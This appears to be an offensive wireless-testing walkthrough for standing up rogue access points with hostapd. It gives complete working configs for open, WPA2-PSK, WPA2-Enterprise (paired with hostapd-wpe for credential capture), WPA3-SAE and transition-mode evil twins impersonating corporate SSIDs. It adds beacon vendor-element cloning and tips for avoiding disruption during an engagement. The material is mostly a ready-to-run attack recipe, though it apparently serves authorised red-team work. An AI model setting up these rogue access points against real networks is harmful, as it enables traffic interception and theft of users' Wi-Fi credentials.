# hostapd — walkthrough

**Verified against:** hostapd 2.11 as of 2026-Q3

Bring up a rogue AP in each security mode we care about. Every
config below runs on the Pineapple (`hostapd /tmp/config.conf`) or
on a laptop with a supported chipset.

## Preconditions

- hostapd installed (built into Pineapple firmware; `apt install
  hostapd` on Kali).
- Monitor-capable adapter (see `hardware-and-antennas/reference.md`).
- No conflicting service on the target iface (`airmon-ng check kill`).

## Path A — Open evil twin

```
cat > /tmp/hostapd-open.conf <<EOF
interface=wlan1
driver=nl80211
ssid=CorpGuest
hw_mode=g
channel=6
country_code=US
ieee80211d=1
ignore_broadcast_ssid=0
auth_algs=1
EOF
hostapd /tmp/hostapd-open.conf
```

Chain with dnsmasq + captive portal — see
`captive-portal/walkthrough.md`.

## Path B — WPA2-PSK rogue (PSK known)

```
cat > /tmp/hostapd-wpa2.conf <<EOF
interface=wlan1
driver=nl80211
ssid=CorpWiFi
hw_mode=g
channel=6
country_code=US
ieee80211d=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=<the-known-PSK>
ieee80211w=0
EOF
hostapd /tmp/hostapd-wpa2.conf
```

`ieee80211w=0` = PMF-disabled; `1` = optional; `2` = required. Match
the target's setting or your beacon will look different.

## Path C — WPA2-Enterprise rogue (with local RADIUS)

```
cat > /tmp/hostapd-eap.conf <<EOF
interface=wlan1
driver=nl80211
ssid=CorporateEAP
hw_mode=g
channel=6
country_code=US
ieee80211d=1
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1

auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123
EOF
hostapd /tmp/hostapd-eap.conf
```

Point 127.0.0.1:1812 at a freeradius-wpe or hostapd-wpe running on
the loopback.

## Path D — WPA3-SAE rogue

```
cat > /tmp/hostapd-sae.conf <<EOF
interface=wlan1
driver=nl80211
ssid=WPA3Net
hw_mode=g
channel=6
country_code=US
ieee80211d=1
wpa=2
wpa_key_mgmt=SAE
rsn_pairwise=CCMP
sae_password=<the-known-passphrase>
ieee80211w=2
EOF
hostapd /tmp/hostapd-sae.conf
```

PMF is mandatory for SAE (`ieee80211w=2`).

## Path E — WPA3 transition mode (both AKM 2 and 8)

```
cat > /tmp/hostapd-transition.conf <<EOF
interface=wlan1
driver=nl80211
ssid=MixedNet
hw_mode=g
channel=6
country_code=US
ieee80211d=1
wpa=2
wpa_key_mgmt=WPA-PSK SAE
rsn_pairwise=CCMP
wpa_passphrase=<shared PSK>
sae_password=<same passphrase>
ieee80211w=1
EOF
hostapd /tmp/hostapd-transition.conf
```

Both AKM 2 (PSK) and AKM 8 (SAE) advertised. WPA2 clients pick 2;
WPA3-capable pick 8.

## Path F — 5 GHz operation

Same as any of the above, but:

```
hw_mode=a
channel=36        # or 40, 44, 48 in UNII-1
country_code=US
ieee80211n=1
ieee80211ac=1
ht_capab=[HT40+][SHORT-GI-40]
vht_capab=[SHORT-GI-80][RXLDPC]
vht_oper_chwidth=1
vht_oper_centr_freq_seg0_idx=42
```

On UNII-2A/2C DFS channels (52-144), `dfs=1` is **not** a valid
hostapd option. DFS is enabled with:

```
ieee80211h=1
ieee80211d=1
country_code=US
# hostapd then performs CAC automatically on DFS channels (60 s min).
```

Prefer non-DFS channels (UNII-1: 36-48, UNII-3: 149-165) for rogue
APs — the CAC dwell delays beacons and the driver will bounce off
detected radar mid-engagement.

## Path G — Vendor-IE cloning (for evil-twin fidelity)

```
# In hostapd.conf:
vendor_elements=dd0d0050f204104a00011010440001102
```

Bytes are the raw IE data. Extract from a real beacon capture:

```
tshark -r legit.pcapng -Y "wlan.fc.type_subtype == 8" -c 1 \
       -T fields -e wlan.tag_length -e wlan.tag.number -e wlan.tag.oui
```

## Path H — Multi-BSSID (advertise more than one SSID from one radio)

```
interface=wlan1
ssid=GuestSSID

bss=wlan1_0
ssid=CorpSSID
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=whatever
```

The `bss=` sub-block reuses the same driver but announces a second
BSSID.

## Failure modes

- **`hostapd_iface_setup: could not select hw_mode and channel`.**
  The channel isn't valid for your regdomain. `iw reg set US` and
  retry.
- **DFS channels silent.** hostapd waits for CAC (Channel
  Availability Check) — 60 s minimum on DFS channels. Add
  `logger_stdout_level=0` to see progress.
- **Clients associate but can't reach the internet.** Missing DHCP
  or NAT. `dnsmasq` for DHCP, `iptables -t nat` for NAT if you're
  proxying.
- **BSSID collision** with a real AP. Some drivers refuse to bring
  up an AP whose BSSID it can already hear. Change one bit.

## Cite

- hostapd upstream documentation (w1.fi).
- IEEE Std 802.11-2020 — hostapd implements the AP side.
- attacks.json: `evil-twin-clone`,
  `rogue-radius-hostapd-wpe`, `wpa3-transition-downgrade`.
